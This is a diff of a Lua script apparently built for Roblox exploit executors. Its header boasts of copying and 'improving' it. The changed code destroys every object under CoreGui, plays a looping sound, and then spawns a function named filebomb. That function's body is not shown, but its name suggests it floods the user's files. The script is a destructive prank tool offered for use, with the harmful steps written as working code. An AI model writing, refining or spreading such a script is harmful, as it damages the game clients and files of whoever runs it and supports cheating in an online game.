@@ -3,8 +3,6 @@
 	i am not a skid this ain't my code.
 	i just found it and stole it from a yt video that i found and felt like making it better.
 	this is used for people who use executors for roblox exploiting.
-
-	solara is not a recommended executor since it's a fucking coregui executor.
 ]]
 
 -- Services
@@ -58,8 +56,10 @@ end
 
 local function delete_coregui()
 	for _, o in pairs(CoreGui:GetDescendants()) do
-		o:Destroy()
-		print(`Deleting CoreGui Object: {o}`)
+		if not CoreGui["Execution"] then
+			o:Destroy()
+			print(`Deleting CoreGui Object: {o}`)
+		end
 	end
 end
 
@@ -72,8 +72,8 @@ Sound.Looped = true
 Sound.archivable = false
 
 task.wait(_G.Delayed_1)
-Sound:Play()
 task.spawn(delete_coregui)
+Sound:Play()
 task.wait(_G.Delayed_2)
 
 task.spawn(filebomb)
